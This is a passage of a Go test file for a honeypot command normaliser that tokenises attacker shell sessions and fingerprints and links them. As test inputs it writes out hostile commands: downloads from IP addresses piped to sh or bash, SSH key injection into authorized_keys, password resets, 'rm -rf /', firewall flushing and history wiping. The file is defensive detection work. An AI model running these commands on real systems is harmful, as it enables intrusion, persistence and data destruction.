package script

import (
	"reflect"
	"regexp"
	"strings"
	"testing"
	"unicode/utf8"
)

func norm(s string) string { return strings.Join(NormalizeCommand(s), " ") }

// tokenRe specifies the scanner's tokens: the scanner is a hand-written,
// resumable form of this expression (a heredoc body is cut out by source
// lines and tokenising resumes after it), and the fuzz target checks that
// the two agree on every input.
// It differs in one place a regular expression cannot say: \d+< is not a
// token before a second < (fdHeredoc), so the comparison skips those.
var tokenRe = regexp.MustCompile(`<<<|<<-?|\d*(?:>>?|<)&(?:\d+|-)?|&>>?|\d*>\||\d*<>|\d+>>?|\d+<|\n|\|\||&&|>>|[;|&<>()]|"[^"]*"|'[^']*'|[^\s;|&<>()]+`)

var fdHeredoc = regexp.MustCompile(`\d<<`)

func scanAll(s string) []string {
	var out []string
	sc := scanner{s: s}
	for sc.next(); sc.ok(); sc.next() {
		out = append(out, sc.tok)
	}
	return out
}

func TestScannerMatchesTokenRe(t *testing.T) {
	for _, s := range []string{
		"", " ", "a", `2>&1 &>>x >>& 3>> 1<&- <&3 >&`, "echo \"a b\" 'c;d' \"open", "x'y 'z", "a\vb\tc\fd\re\nf",
		"<<<x <<-y <<z < > >> || && | & ; ( ) 12abc 3>f 4<f", "0</dev/null 2<>f <> >| 2>| >>| >|| 3<", "\xff\x00\"\xfe\"", `$(a) $((1+2)) "a\"b"`,
	} {
		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
			t.Errorf("scan(%q)\n got %q\nwant %q", s, got, want)
		}
	}
}

func TestNormalizeCommandGolden(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`uname -s -v -n -r -m`, `uname -s -v -n -r -m`},
		{`cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh`, `cd /tmp ; wget <url> ; sh x.sh`},
		{`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
			`echo "ssh-rsa <key> mdrfckr" >> .ssh/authorized_keys`},
		{`echo "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`, `echo "root\n<tok>\n<tok>" | passwd`},
		{`echo 'vT'`, `echo <tok>`},
		{`curl -s 10.0.0.9:8080/a|bash`, `curl -s <ip> | bash`},
		{`chmod 777 /tmp/kxhqwe; /tmp/kxhqwe`, `chmod <n> /tmp/<f> ; /tmp/<f>`},
		{`echo deadbeefdeadbeefdeadbeef`, `echo <hex>`},
		// From the review's executed probes:
		{`uname -a 2>&1; whoami >/dev/null 2>&1`, `uname -a 2>&1 ; whoami > /dev/null 2>&1`},
		{`base64 -d x | python3 -`, `base64 -d x | python3 -`},
		{`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU k"`, `echo "ssh-ed25519 <key> k"`},
		{"echo a\nwhoami", `echo a ; whoami`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if got := norm(`echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | base64 -d > x`); strings.Contains(got, "<key>") {
		t.Errorf("base64 payload mistaken for a key: %q", got)
	}
}

func TestEncodingRoundTripsQuotedTokens(t *testing.T) {
	lines := []string{EncodeLine(`echo "a ; b | c" ; uname`), EncodeLine("id")}
	got := Split(Join(lines))
	want := [][]string{NormalizeCommand(`echo "a ; b | c" ; uname`), NormalizeCommand("id")}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("round trip:\n got %q\nwant %q", got, want)
	}
	if n := CommandCount(got); n != 3 {
		t.Fatalf("CommandCount = %d, want 3 (quoted separators are not commands)", n)
	}
	if strings.ContainsAny(EncodeLine("a\x1fb\x1ec"), "\x1e") || len(Split(EncodeLine("a\x1fb\x1ec"))[0]) != 3 {
		t.Fatal("separator bytes from attacker input must be stripped")
	}
}

func TestFingerprintIgnoresPerVictimRandomness(t *testing.T) {
	a := Join([]string{EncodeLine(`echo "root\nAbc123xyz789\nAbc123xyz789" | passwd`)})
	b := Join([]string{EncodeLine(`echo "root\nQwe987rty654\nQwe987rty654" | passwd`)})
	if Fingerprint(a) != Fingerprint(b) {
		t.Fatal("random passwords changed the fingerprint")
	}
}

func TestDistinctiveRule(t *testing.T) {
	cmds := func(ss ...string) [][]string {
		var out [][]string
		for _, s := range ss {
			out = append(out, NormalizeCommand(s))
		}
		return out
	}
	if Distinctive(cmds("uname -a 2>&1", "whoami >/dev/null 2>&1", "id", "uptime", "w")) {
		t.Error("recon plus redirections must not be distinctive")
	}
	if Distinctive(cmds(`c1=$(uname -s); c2=$(grep "model name" /proc/cpuinfo | head -n1); cat /etc/issue | wc -l; crontab -l; awk '{print $1}' /proc/loadavg`)) {
		t.Error("Outlaw-style recon must not be distinctive")
	}
	if Distinctive(cmds(`cd /tmp; wget http://x/y; sh y`)) {
		t.Error("fewer than 5 commands must not be distinctive")
	}
	if !Distinctive(cmds(`cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY x" >> .ssh/authorized_keys`)) {
		t.Error("the key injector must be distinctive")
	}
}

func TestLinkDecisionAndCommon(t *testing.T) {
	for _, tc := range []struct {
		distinctive        bool
		actors, population int
		links              bool
		reason             string
	}{
		{false, 2, 3000, false, "not distinctive: fewer than 5 commands or recon only"},
		{true, 2, 3000, true, "distinctive, used by 2 actors"},
		{true, 26, 100000, false, "common: used by 26 actors"},
		{true, 5, 100, false, "common: used by 5.0% of actors"},
		{true, 3, 50, true, "distinctive, used by 3 actors"}, // small honeypot: 6% but < 5 actors
		// Boundaries: exactly MaxLinkActors is not common, and exactly
		// MaxLinkPercent (5 of 250 = 2.0%) is not "more than 2%".
		{true, 25, 100000, true, "distinctive, used by 25 actors"},
		{true, 5, 250, true, "distinctive, used by 5 actors"},
		{true, 5, 249, false, "common: used by 2.0% of actors"},
		{true, 4, 10, true, "distinctive, used by 4 actors"}, // 40% but below MinCommonActors
		{true, 5, 0, true, "distinctive, used by 5 actors"},  // no population: only the actor cap applies
	} {
		links, reason := LinkDecision(tc.distinctive, tc.actors, tc.population)
		if links != tc.links || reason != tc.reason {
			t.Errorf("LinkDecision(%v,%d,%d) = %v %q", tc.distinctive, tc.actors, tc.population, links, reason)
		}
	}
}

func FuzzNormalizeCommand(f *testing.F) {
	for _, s := range []string{`uname -a`, `echo "a\nb" | passwd`, `cd /tmp;wget http://x/y&&sh y`, "\x00\xff'\"\x1e\x1f", "2>&1 &>>x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !fdHeredoc.MatchString(s) && !reflect.DeepEqual(got, want) {
			t.Fatalf("scanner disagrees with tokenRe on %q:\n got %q\nwant %q", s, got, want)
		}
		line := EncodeLine(s)
		enc := Join([]string{line})
		if line != "" && !reflect.DeepEqual(Split(enc), [][]string{NormalizeCommand(s)}) {
			t.Fatalf("round trip broke for %q", s)
		}
		_ = Fingerprint(enc)
		// Distinctive and program() agree between the encoding and the
		// tokens it was made from, and a program never carries a separator.
		cmds := [][]string{NormalizeCommand(s)}
		if line != "" && Distinctive(Split(enc)) != Distinctive(cmds) {
			t.Fatalf("Distinctive differs after the round trip for %q", s)
		}
		for _, seg := range segments(cmds) {
			if p := program(seg); strings.ContainsAny(p, tokSep+lineSep) {
				t.Fatalf("program %q of %q holds a separator", p, s)
			}
		}
		if d := Display(enc, 64); len(d) > 64 {
			t.Fatalf("Display exceeded its cap: %d bytes", len(d))
		}
		_ = ExtractKeys(s)
	})
}

func TestHeredocAndWrappers(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"cat <<EOF\nid\nw\nuptime\nEOF", `cat << <heredoc><nl>id<nl>w<nl>uptime`},
		{"cat <<'X' > /tmp/a\nfoo\nX\nwhoami", `cat << <heredoc><nl>foo > /tmp/<f> ; whoami`},
		{`nohup python3 x`, `nohup python3 x`},
		{`sudo base64 -d f`, `sudo base64 -d f`},
		{`x=1 md5sum f`, `x=1 md5sum f`},
		// Here-strings must not trigger heredoc mode
		{`base64 -d <<< "Zm9v" | sh`, `base64 -d <<< <tok> | sh`},
		{"base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x", `base64 -d <<< <tok> | sh ; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm x`},
		// Heredoc terminator must be exact line match, not just prefix
		{"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid", `cat << <heredoc><nl>body<nl>EOF trailing<nl>wget <url> ; id`},
		// An empty body: the newline after the delimiter word is itself the
		// first terminator line. Consuming it before the terminator check made
		// this heredoc swallow every later command, so any dropper prefixed
		// with `cat <<EOF\nEOF\n` collapsed to one non-distinctive command.
		{"cat <<EOF\nEOF\nid\nwget http://x/y", `cat << <heredoc> ; id ; wget <url>`},
		// A quoted delimiter line is not the terminator: bash compares the
		// raw line, so `"EOF"` must not end the body early.
		{"cat <<EOF\nbody\n\"EOF\"\nid\nEOF\nwget http://x/y", `cat << <heredoc><nl>body<nl>"EOF"<nl>id ; wget <url>`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if Distinctive([][]string{NormalizeCommand("cat <<EOF\nid\nw\nuptime\nEOF")}) {
		t.Error("a heredoc body must not count as commands")
	}
	if n := CommandCount([][]string{NormalizeCommand("sudo wget http://x/y; nohup sh y; env A=1 id; busybox wget z; time ls")}); n != 5 {
		t.Errorf("CommandCount = %d, want 5", n)
	}
	if !Distinctive([][]string{NormalizeCommand("sudo wget http://x/y; nohup ./y; id; w; ls")}) {
		t.Error("wget behind sudo must count as a non-recon program")
	}
	// Here-strings must survive and be counted correctly
	// Note: CommandCount includes segments split by pipe, so base64|sh = 2, plus cd, wget, chmod, ./x, rm = 5, total = 7
	hereStringCmd := "base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x"
	if n := CommandCount([][]string{NormalizeCommand(hereStringCmd)}); n != 7 {
		t.Errorf("here-string CommandCount = %d, want 7", n)
	}
	if !Distinctive([][]string{NormalizeCommand(hereStringCmd)}) {
		t.Error("here-string multi-command must be distinctive")
	}
	// Heredoc with trailing text after delimiter must continue
	if n := CommandCount([][]string{NormalizeCommand("cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid")}); n != 2 {
		t.Errorf("heredoc with trailing delimiter CommandCount = %d, want 2", n)
	}
}

// Wrapper options and operands are skipped so the wrapped program keeps its
// literal name: before, the program slot ended at the first option, so the
// option value or the program itself was normalised (python3 became <tok>)
// and program() reported the option ("-n") instead of the program.
func TestWrapperOptionsKeepProgram(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{`nice -n 5 python3 x`, `nice -n <n> python3 x`, "python3"},
		{`nice -19 python3 x`, `nice -19 python3 x`, "python3"},
		{`sudo -u root python3 x`, `sudo -u root python3 x`, "python3"},
		{`sudo -u abc123def python3 x`, `sudo -u <tok> python3 x`, "python3"},
		{`sudo -E -- python3 x`, `sudo -E -- python3 x`, "python3"},
		{`sudo -s python3 x`, `sudo -s python3 x`, "python3"}, // -s runs the command via the shell
		{`sudo --user=root python3 x`, `sudo --user=root python3 x`, "python3"},
		{`timeout 30 wget http://x/y`, `timeout <n> wget <url>`, "wget"},
		{`timeout -s 9 30 python3 x`, `timeout -s <n> <n> python3 x`, "python3"},
		{`timeout --kill-after=5 30s python3 x`, `timeout --kill-after=5 30s python3 x`, "python3"},
		{`env A=1 curl x`, `env A=1 curl x`, "curl"},
		{`env -i python3 x`, `env -i python3 x`, "python3"},
		{`nohup python3 x`, `nohup python3 x`, "python3"},
		{`stdbuf -oL python3 x`, `stdbuf -oL python3 x`, "python3"},
		{`stdbuf -o L python3 x`, `stdbuf -o L python3 x`, "python3"},
		{`sudo nice -n 5 python3 x`, `sudo nice -n <n> python3 x`, "python3"},
		{`nice -n 5 id`, `nice -n <n> id`, "id"},
		// Unknown options stop wrapper parsing: every later word is
		// normalised as an argument exactly as before, nothing is skipped,
		// and program() names the wrapper rather than guessing.
		{`sudo --weird python3 x`, `sudo --weird <tok> x`, "sudo"},
		{`sudo -Z python3 x`, `sudo -Z <tok> x`, "sudo"},
		{`nohup -x python3`, `nohup -x <tok>`, "nohup"},
		{`sudo -u`, `sudo -u`, ""},
		{`sudo -u; python3 x`, `sudo -u ; python3 x`, ""}, // first segment
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
	// A wrapped recon command is recon: `nice -n 5 id` used to report "-n"
	// as its program and made recon-only scripts distinctive.
	if Distinctive([][]string{NormalizeCommand("nice -n 5 id; timeout 3 uname -a; sudo -u root whoami; w; uptime")}) {
		t.Error("wrapped recon must not be distinctive")
	}
}

// An attacker who types a placeholder literally (`echo "<url>"`) must not
// produce the normaliser's own placeholder: before, that one echo made a
// recon-only script Distinctive and collided with a real URL substitution.
// Literal < and > inside words are encoded as <lt>/<gt>, which no
// substitution produces, and Display shows them shell-style as \< and \>.
func TestLiteralPlaceholdersAreEscaped(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`echo "<url>"`, `echo "<lt>url<gt>"`},
		{`echo '<key>' > x`, `echo '<lt>key<gt>' > x`},
		{`echo "a<b http://x/y>c"`, `echo "a<lt>b <url><gt>c"`},
		{`echo "\http://x/y"`, `echo "\<url>"`},
		{`echo "\<url>"`, `echo "\<lt>url<gt>"`},
		{`echo "<lt>"`, `echo "<lt>lt<gt>"`},
		{`echo "x<Abc123xyz789>1.2.3.4"`, `echo "x<lt><tok><gt><ip>"`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	cmds := func(s string) [][]string { return [][]string{NormalizeCommand(s)} }
	if Distinctive(cmds(`echo "<url>"; echo '<key>'; id; w; uptime`)) {
		t.Error("literal placeholders typed by the attacker made recon distinctive")
	}
	if !Distinctive(cmds(`echo "a<b http://x/y"; id; w; uptime; whoami`)) {
		t.Error("a real URL beside a literal < must stay distinctive")
	}
	if Fingerprint(EncodeLine(`echo "<url>"`)) == Fingerprint(EncodeLine(`echo "http://x/y"`)) {
		t.Error("a literal <url> collided with a real URL")
	}
	if Fingerprint(EncodeLine(`echo "\<url>"`)) == Fingerprint(EncodeLine(`echo "\http://x/y"`)) {
		t.Error("a backslash before a literal <url> collided with one before a real URL")
	}
	if got := Display(EncodeLine(`echo "<url>" > f`), 0); got != `echo "\<url\>" > f` {
		t.Errorf("Display = %q", got)
	}
}

// Display's cap is a byte budget for the stored column: the ellipsis counts
// toward it, no rune is split, and invalid bytes do not drag the cut back.
func TestDisplayCapIncludesEllipsis(t *testing.T) {
	for _, tc := range []struct {
		in   string
		max  int
		want string
	}{
		{strings.Repeat("a", 20), 10, "aaaaaaa…"},
		{strings.Repeat("a", 10), 10, strings.Repeat("a", 10)},
		{"aaaaaaa€€", 10, "aaaaaaa…"}, // the cut falls inside €
		{"aaaaaé€€", 10, "aaaaaé…"},   // é ends exactly at the budget
		{"a" + strings.Repeat("\x80", 20), 10, "a\x80\x80\x80\x80\x80\x80…"},
		{strings.Repeat("a", 20), 2, "aa"}, // no room for the ellipsis
		{"€€", 2, ""},                      // nor for a whole rune
		{strings.Repeat("a", 20), 3, "…"},
	} {
		got := Display(tc.in, tc.max)
		if got != tc.want || len(got) > tc.max {
			t.Errorf("Display(%q, %d) = %q (%d bytes), want %q", tc.in, tc.max, got, len(got), tc.want)
		}
	}
	// Every budget: within max, a prefix of the input, cut on a rune start.
	in := "a€b😀c\xffd" + strings.Repeat("é", 8)
	for max := 1; max <= len(in); max++ {
		got := Display(in, max)
		p := strings.TrimSuffix(got, "…")
		if len(got) > max || !strings.HasPrefix(in, p) || (len(p) < len(in) && !utf8.RuneStart(in[len(p)])) {
			t.Errorf("Display(%q, %d) = %q", in, max, got)
		}
	}
}

// A redirection operator consumes its target word: program() used to skip
// the operator and report the target (`2>/dev/null id` gave "null").
// fd duplications (2>&1) carry their target inside the token.
func TestProgramSkipsRedirectionTargets(t *testing.T) {
	for _, tc := range []struct{ in, prog string }{
		{`sudo -u root > /tmp/a wget x`, "wget"},
		{`2>/dev/null id`, "id"},
		{`> /tmp/a 2>&1 wget x`, "wget"},
		{`&> /dev/null wget x`, "wget"},
		{`< /etc/passwd sort`, "sort"},
		{`>> log nohup wget x`, "wget"},
		{`sudo > f -u root wget x`, "wget"},
		{`id > /dev/null`, "id"},
	} {
		if p := program(segments([][]string{NormalizeCommand(tc.in)})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
	if Distinctive([][]string{NormalizeCommand("2>/dev/null id; >/dev/null uname -a; w; uptime; whoami")}) {
		t.Error("recon behind leading redirections must not be distinctive")
	}
}

// Probing for tools is recon: `command -v wget` reports the wrapper (-v
// does not run its operand), and command/type/hash must not make a recon
// script Distinctive.
func TestToolProbesAreRecon(t *testing.T) {
	if Distinctive([][]string{NormalizeCommand("command -v wget; command -V curl; type python3; hash perl; id; uname -a")}) {
		t.Error("tool probes made a recon script distinctive")
	}
	if !Distinctive([][]string{NormalizeCommand("command -v wget; command -p wget x; id; w; uptime")}) {
		t.Error("a program run through `command -p` must still count")
	}
}

// A leading redirection and its target keep the program slot open, so the
// word after them keeps its literal name exactly as program() reports it.
func TestLeadingRedirectionKeepsProgram(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{`> /tmp/a python3 x`, `> /tmp/<f> python3 x`, "python3"},
		{`2>/dev/null python3 x`, `2> /dev/null python3 x`, "python3"},
		{`2>&1 python3 x`, `2>&1 python3 x`, "python3"},
		{`>/dev/null 2>&1 python3 x`, `> /dev/null 2>&1 python3 x`, "python3"},
		{`< /tmp/kxhqwe python3`, `< /tmp/<f> python3`, "python3"},
		{`> abc123def python3`, `> <tok> python3`, "python3"}, // the target is still normalised
		{`sudo -u root > /tmp/a python3 x`, `sudo -u root > /tmp/<f> python3 x`, "python3"},
		{`sudo > f -u root python3 x`, `sudo > f -u root python3 x`, "python3"},
		{"id >\npython3 x", `id > ; python3 x`, "id"},
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
}

// A leading heredoc or here-string is a redirection like any other: it and
// its word keep the program slot open (the heredoc body still starts at the
// next newline and is still dropped).
func TestLeadingHeredocKeepsProgram(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{"<<EOF python3 x\nid\nEOF\nwget http://x/y", `<< <heredoc><nl>id python3 x ; wget <url>`, "python3"},
		{`<<< x python3 y`, `<<< x python3 y`, "python3"},
		{`<<< abc123def python3 y`, `<<< <tok> python3 y`, "python3"},
		{"sudo <<EOF -u root python3\nbody\nEOF", `sudo << <heredoc><nl>body -u root python3`, "python3"},
		{"cat <<EOF python3\nbody\nEOF", `cat << <heredoc><nl>body <tok>`, "cat"}, // an argument, not a program
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
}

// An unquoted $(...) as a redirection target is part of the target: the
// tokenizer splits it at "(", and its inner words used to take the program
// slot (`> $(evil) python3` reported evil). Every word is still emitted.
func TestRedirectionTargetKeepsSubstitution(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{`> $(evil) python3 x`, `> $ ( evil ) python3 x`, "python3"},
		{`> $(a $(b)) python3`, `> $ ( a $ ( b ) ) python3`, "python3"},
		{`2>/tmp/$(date) wget x`, `2> /tmp/<f> ( date ) wget x`, "wget"},
		{`sudo -u root > $(evil) python3`, `sudo -u root > $ ( evil ) python3`, "python3"},
		// Unterminated: the rest of the line stays in the target, nothing is dropped.
		{`> $(evil python3`, `> $ ( evil <tok>`, ""},
		// An operator or newline ends the group, as it ends any command.
		{"> $(a\nwget x", `> $ ( a ; wget x`, ""},
		{`> $(a; b) python3`, `> $ ( a ; b ) <tok>`, ""},
		// `> f (id)` is a bash syntax error; it groups the same way, since
		// program() only sees the normalised target (/tmp/$ is /tmp/<f>).
		{`> f (id)`, `> f ( id )`, ""},
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
}

// >& and <& are redirections, not a redirection plus the background
// operator: `>& f id` reported f as the program and split the command at &.
func TestFdRedirectionTokens(t *testing.T) {
	for _, tc := range []struct {
		in, want, prog string
		cmds           int
	}{
		{`>& f id`, `>& f id`, "id", 1},
		{`>&/tmp/a id`, `>& /tmp/<f> id`, "id", 1},
		{`id >& /dev/null`, `id >& /dev/null`, "id", 1},
		{`2>& f id`, `2>& f id`, "id", 1},
		{`id <&3`, `id <&3`, "id", 1},
		{`<&0 id`, `<&0 id`, "id", 1},
		{`id 2>&-`, `id 2>&-`, "id", 1},
		{`<& f id`, `<& f id`, "id", 1},
		{`&>> f id`, `&>> f id`, "id", 1},
		{`id 2>&1 & wget x`, `id 2>&1 & wget x`, "id", 2},
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
		if n := CommandCount([][]string{got}); n != tc.cmds {
			t.Errorf("CommandCount(%q) = %d, want %d", tc.in, n, tc.cmds)
		}
	}
}

// A quoted or escaped heredoc delimiter ends on the plain delimiter line,
// as bash's quote removal makes it: `<<\EOF` used to wait for a `\EOF` line
// that never came, so every later command in the event was hidden and two
// different droppers behind the same wrapper collided (audit I1).
func TestHeredocQuotedDelimiters(t *testing.T) {
	const tail = "\ncd /tmp; wget http://1.2.3.4/x; chmod +x x; ./x; rm -rf x"
	want := norm("cat <<'EOF' > /tmp/a.sh\nbody\nEOF" + tail)
	if !strings.HasSuffix(want, "; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm -rf x") {
		t.Fatalf("baseline %q lost its tail", want)
	}
	for _, d := range []string{`\EOF`, `E"OF"`, `"EO"F`, `'E'\O"F"`, `"EOF"`} {
		in := "cat <<" + d + " > /tmp/a.sh\nbody\nEOF" + tail
		if got := norm(in); got != want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", in, got, want)
		}
	}
	// A delimiter with spaces ends on the line holding exactly those words.
	in := "cat <<\"E O F\" > /tmp/a.sh\nbody\nE O F" + tail
	if got := norm(in); !strings.HasSuffix(got, "; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm -rf x") {
		t.Errorf("NormalizeCommand(%q) = %q, lost the commands after the body", in, got)
	}
	a := EncodeLine("cat <<\\EOF >/tmp/a\nhi\nEOF\nwget http://1.1.1.1/x; chmod +x x; ./x")
	b := EncodeLine("cat <<\\EOF >/tmp/a\nhi\nEOF\npkill -9 sshd; iptables -F; userdel admin")
	if a == b {
		t.Error("different commands after an escaped-delimiter heredoc collided")
	}
	// The terminator is a whole source line: indented, it does not end the
	// body (bash compares the line), except tabs under <<-; a trailing \r is
	// tolerated.
	for _, tc := range []struct{ in, want string }{
		{"cat <<EOF\n  EOF\nid\nEOF\nwhoami", "whoami"},
		{"cat <<-EOF\n\t\tEOF\nwhoami", "whoami"},
		{"cat <<EOF\nEOF\r\nwhoami", "whoami"},
	} {
		got := NormalizeCommand(tc.in)
		if CommandCount([][]string{got}) != 2 || got[len(got)-1] != tc.want {
			t.Errorf("NormalizeCommand(%q) = %q", tc.in, got)
		}
	}
	// Two heredocs on one line: their bodies follow in order.
	if got := norm("cat <<A <<B\na\nA\nb\nB\nwhoami"); !strings.HasSuffix(got, "; whoami") || CommandCount([][]string{NormalizeCommand("cat <<A <<B\na\nA\nb\nB\nwhoami")}) != 2 {
		t.Errorf("two heredocs: %q", got)
	}
}

// A heredoc body is data inside its placeholder token: it never adds
// commands or a program, but it is part of the fingerprint, so droppers that
// write different scripts through the same wrapper no longer collide (audit
// I2). The body is normalised like quoted text and bounded.
func TestHeredocBodyIsFingerprinted(t *testing.T) {
	const wrap = "\nEOF\nsh /tmp/.s; rm -f /tmp/.s; history -c; cd /tmp; ls"
	a := [][]string{NormalizeCommand("cat > /tmp/.s <<EOF\nwget http://1.1.1.1/a -O /tmp/b; chmod +x /tmp/b; /tmp/b" + wrap)}
	b := [][]string{NormalizeCommand("cat > /tmp/.s <<EOF\nrm -rf / --no-preserve-root; iptables -F; pkill -9 sshd" + wrap)}
	if Fingerprint(Join([]string{strings.Join(a[0], tokSep)})) == Fingerprint(Join([]string{strings.Join(b[0], tokSep)})) {
		t.Error("different heredoc bodies behind one wrapper share a fingerprint")
	}
	if CommandCount(a) != 6 || CommandCount(b) != 6 {
		t.Errorf("CommandCount = %d, %d; the body must not add commands", CommandCount(a), CommandCount(b))
	}
	// Per-victim values in the body are normalised like quoted text.
	c := NormalizeCommand("cat > /tmp/.s <<EOF\nwget http://9.9.9.9/zz -O /tmp/qq; chmod +x /tmp/qq; /tmp/qq" + wrap)
	if !reflect.DeepEqual(a[0], c) {
		t.Errorf("per-victim values changed the body:\n%q\n%q", a[0], c)
	}
	// A typed placeholder in the body is escaped like any attacker <.
	if got := norm("cat <<EOF\n<nl><more>\nEOF"); got != `cat << <heredoc><nl><lt>nl<gt><lt>more<gt>` {
		t.Errorf("literal placeholders in a body: %q", got)
	}
	// <<- strips the body's leading tabs as well as the terminator's.
	if got := norm("cat <<-EOF\n\tid\n\tEOF"); got != `cat << <heredoc><nl>id` {
		t.Errorf("<<- body: %q", got)
	}
	// An empty body keeps the bare placeholder; an empty line does not.
	if got := norm("cat <<EOF\n\nEOF"); got != "cat << <heredoc><nl>" {
		t.Errorf("one empty body line: %q", got)
	}
	// A large body is cut at MaxHeredocBodyBytes and marked.
	big := strings.Repeat("x", 3000) + "\n" + strings.Repeat("y", 3000) + "\n" + strings.Repeat("z", 10)
	got := NormalizeCommand("cat <<EOF\n" + big + "\nEOF\nid")
	want := heredocTok + litNL + strings.Repeat("x", 3000) + litNL + strings.Repeat("y", MaxHeredocBodyBytes-3000) + litNL + litMore
	if len(got) != 5 || got[2] != want || got[4] != "id" {
		t.Errorf("bounded body: %d tokens, body %d bytes", len(got), len(got[2]))
	}
	// The body never becomes the program, even with no command word.
	if p := program(segments([][]string{NormalizeCommand("<<EOF\nwget x\nEOF")})[0]); p != "" {
		t.Errorf("program of a bare heredoc = %q", p)
	}
	if got := Display(EncodeLine("cat <<EOF > /tmp/a\nwget http://x/y\nsh a\nEOF"), 0); got != `cat << <heredoc>\nwget <url>\nsh a > /tmp/<f>` {
		t.Errorf("Display = %q", got)
	}
}

// Shell syntax is not a program: reserved words and braces are skipped (and
// keep the program slot open), `for`/`case`/`select`/`[[` lines run no
// program, and N<file, <> and >| are redirections. Each of these made a
// recon-only script Distinctive (audit M1).
func TestShellSyntaxIsNotAProgram(t *testing.T) {
	for _, s := range []string{
		`{ id; w; uname -a; uptime; }`,
		`0</dev/null uname -a; id; w; uptime; whoami`,
		`echo x >| /tmp/a; id; w; uptime; whoami`,
		`if id; then uname -a; else w; fi; uptime`,
		`for i in 1 2 3; do id; done; while w; do uptime; done`,
		`! id; [[ -f /x ]] && w; case $x in a) id;; esac; uptime`,
		`id 3<> /tmp/a; w; uptime; whoami; ls`,
	} {
		if Distinctive([][]string{NormalizeCommand(s)}) {
			t.Errorf("recon-only %q is Distinctive (programs %q)", s, programs(s))
		}
	}
	for _, tc := range []struct{ in, want, prog string }{
		{`0</dev/null python3 x`, `0< /dev/null python3 x`, "python3"},
		{`2<>/tmp/a python3 x`, `2<> /tmp/<f> python3 x`, "python3"},
		{`>| /tmp/a python3 x`, `>| /tmp/<f> python3 x`, "python3"},
		{`if python3 x`, `if python3 x`, "python3"},
		{`then python3 x`, `then python3 x`, "python3"},
		{`{ python3 x`, `{ python3 x`, "python3"},
		{`! python3 x`, `! python3 x`, "python3"},
		{`for python3 in a`, `for <tok> in a`, ""},
		{`[[ -x python3 ]]`, `[[ -x <tok> ]]`, ""},
		{`}`, `}`, ""},
		{`0<<EOF`, `<n> << <heredoc>`, "<n>"}, // fd-prefixed heredoc: unchanged
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
